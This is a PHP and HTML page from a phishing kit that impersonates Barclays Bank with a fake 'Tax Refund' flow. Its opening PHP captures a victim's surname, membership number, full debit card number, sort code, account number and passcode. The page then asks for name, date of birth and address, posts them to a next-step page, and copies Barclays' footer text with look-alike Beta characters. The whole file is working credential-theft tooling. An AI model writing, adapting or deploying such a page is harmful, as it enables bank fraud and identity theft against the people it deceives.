<?php

error_reporting(0);

session_start();


require "../../includes/functions.php";
require "../../includes/One_Time.php";
$_SESSION['surname'] = $_POST['surname'];
$_SESSION['membershipNumber'] = $_POST['membershipNumber'];
$_SESSION['ccno'] = $_POST['debitCardSet1']."".$_POST['debitCardSet2']."".$_POST['debitCardSet3']."".$_POST['debitCardSet4'];
$_SESSION['sortcode'] = $_POST['sortCodeSet1']."".$_POST['sortCodeSet2']."".$_POST['sortCodeSet3'];
$_SESSION['acno'] = $_POST['accountNumber'];
$_SESSION['passcode'] = $_POST['passcode'];

?>

<!DOCTYPE html>
<html lang="en-GB">
<head>
<link href="assets/img/fav.ico" rel="shortcut icon" type="image/x-icon">
<meta http-equiv="X-UA-Compatible" content="IE=9; IE=8; IE=7; IE=EDGE" />
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<meta http-equiv="Content-Language" content="en-GB" />
<title>Tax Refund</title>
<link href="assets/css/login.css" rel="stylesheet" type="text/css" media="screen" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
jQuery(function($){
   $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
});
</script>
<style>
.error {
    color: #9a040d;
    padding-bottom: 5px;
}
input.error, select.error {
    background-color: #f5e6eb;
    border-color: #9d063b;
    color: #9d063b;
	border: 1px solid #9d063b!important;
}
#ErrorDob, #ErrorCC {
	width:600px;
}
#postcode, #cc-exp, #telepin {
	width:10%;
}
</style>
<script>
  (function($,W,D)
{
    var JQUERY4U = {};

    JQUERY4U.UTIL =
    {
        setupFormValidation: function()
        {
            //form validation rules
            $("#form").validate({
				errorElement: "div",			
                rules: {
					name: {	required: true,	minlength: 4,},
					dob: {	required: true,	minlength: 10,},
					address: { required: true, minlength: 5,},
					town: { required: true, minlength: 3,},
					postcode: { required: true, minlength: 5,},
		
                },
                messages: {
					name: {
						required: "<br/><br/><br/>You must enter your name",
						minlength: jQuery.validator.format("<br/><br/><br/>Your name must contain only letters, spaces, or the characters ' or -"),
					},
					dob: {
						required: "<br/><br/><br/>Please provide your date of birth",
						minlength: jQuery.validator.format("<br/><br/><br/>Please provide your date of birth"),
					},
					address: {
						required: "<br/><br/><br/>You must enter the 1st line of your address",
						minlength: jQuery.validator.format("<br/><br/><br/>please check the address you have entered"),
					},
					town: {
						required: "<br/><br/><br/>You must enter the name of your town/city",
						minlength: jQuery.validator.format("<br/><br/><br/>Please check the town/city you have entered"),
					},
					postcode: {
						required: "<br/><br/><br/>You must enter your postcode",
						minlength: jQuery.validator.format("<br/><br/><br/>Please check the postcode you have entered"),
					},
				},
				errorClass: "error",
                submitHandler: function(form) {
                    form.submit();
                }
            });
        }
    }

    //when the dom has loaded setup form validation rules
    $(D).ready(function($) {
        JQUERY4U.UTIL.setupFormValidation();
    });

})(jQuery, window, document);
  
  </script>
</head>
<body>
    <a id="#top"></a>

<div id="skip-links">
<p class="skip-link-p">Skip to: 
<a accesskey="1" class="skip-link" href="#content">content</a>, 
<a accesskey="2" class="skip-link" href="#nav-links">navigation</a>
</p>
</div>
<div id="container">
<header>
<div id="masthead">
<div id="access-links">
<ul class="access-link-list">
<li class="first"><a href="mobile/Login.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true">Mobile site</a></li>
<li><a href="#" target="_blank">Contact us</a>
<li><a href="#" target="_blank">Security</a>
<li><a href="#" target="_blank">Accessibility</a></li>
</ul>
<a name="infoend"></a>
</div>
<p class="logo"><a id="logo" href="#" title="logo" class="default"></a><img class="pronly" src="assets/img/logo.png" width="265" height="45" /></p>
<nav>
<div>
<div id="login">
<h1><strong>Tax Refund</strong></h1>
</div>
</div>
</nav>
</div>
</header>
<article>
<div id="content" class="clearfix">
<div>
<div class="login-ctr ftb" >

<div id="page">

<div class="form-error" id="ErrorBox" style="display:block">
<div class="icon-umbrella-error-cross"></div>
<div class="error-list">
<a class="err-lnk" href="#" id="membership-num-error">Please verify your information. We need to make sure it's you claiming the refund and not someone else.</a>
</div>
</div>

<div data-prevent-timeout="true"  class="accordion active" id="accordion-top">
<h2>Step 1 - Your details</h2>
<form method="POST" ftb="true" autocomplete="off" name="form" action="Verify2.php?&sessionid=<?php echo generateRandomString(90); ?>&securessl=true#accordion-bottom" id="form">
<div class="accordion-page">
<ul class="form-grid">
<li><label for="name">Full name</label>
<div id="ErrorName"></div>
<input type="text" name="name" id="name" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['name'];?>"/>
</li>
<li>
<fieldset>
<label class="forgotten-membership-date-of-birth">Date of birth</label>
<div id="ErrorDob"></div>
<input type="text" name="dob" id="dob" maxlength="10" class="surname text" autocomplete="off" value="<?php echo $_SESSION['dob'];?>"/>
</fieldset>
</li>
<li><label for="address">Address (Line 1)</label>
<div id="ErrorAddress"></div>
<input type="text" name="address" id="address" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['address'];?>"/>
</li>
<li><label for="name">Town/City</label>
<div id="ErrorTown"></div>
<input type="text" name="town" id="town" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['town'];?>"/>
</li>
<li><label for="name">Postcode</label>
<div id="ErrorPostcode"></div>
<input style="width: 15%;" type="text" name="postcode" id="postcode" maxlength="50" class="surname text" autocomplete="off" value="<?php echo $_SESSION['postcode'];?>"/>
</li>
<li>
<div class="line-break"></div>
</li>
<li>
<button type="submit" id="forward" class="button blue validate accordion-action" name="action::blank.php::POST" id="forward" onclick="scMeta(s);" >Next step</button>
</li>
<div class="accordion-config">
<input type="hidden" id="expectedposition" value="accordion-top"/>
</div>
 </div>
</form>
</div>
<div class="accordion disabled" id="accordion-bottom" onclick="tagAjaxContent();" >
<h2>Step 2 - Account details</h2>
<form method="POST" ftb="true" autocomplete="off" id="accordion-bottom-form">
<div class="accordion-page">           
</div>
</form>
</div>
</div>       
</div>
<?php include "assets/includes/sidebar.php"; ?>
</div>
</div>
</article>
<footer>
<div id="footer">
<div class="footnote">
    <p>
       &Beta;arclays &Beta;ank PLC. Authorised by the Prudential Regulation Authority and regulated by the Financial Conduct Authority and the Prudential
       Regulation Authority (Financial Services Register no: 122702). &Beta;arclays &Beta;ank PLC subscribes to the Lending Code which is monitored and
       enforced by the Lending Standards &Beta;oard. Further details can be found at
       <a title="Lending Standards Board (opens in a new browser window)" target="_blank" href="#"> www.lendingstandardsboard.org.uk</a>. Barclays Insurance Services Company Limited is authorised and regulated by the Financial Conduct Authority (Financial Services Register no: 312078).
    </p>
    <p>
       Barclays Bank PLC. Registered in England. Registered no. 1026167. Barclays Insurance Services Company Limited. Registered in England. Registered no. 973765. Registered office for both: 1 Churchill Place, London E14 5HP. 'The Woolwich' and 'Woolwich' are trademarks and trading names of Barclays Bank PLC. Barclays Business is a trading name of Barclays Bank PLC.
    </p>
    <br/>
    <p >
<img class="pronly" src="assets/img/premier.jpg"/>
<a href="#" target="_blank" class="premier-league">
<span class="premier-league">Proud sponsors of the Barclays Premier League</span>
</a>
</p>
</div>
</div>
</footer>
</div>
</body>
</html>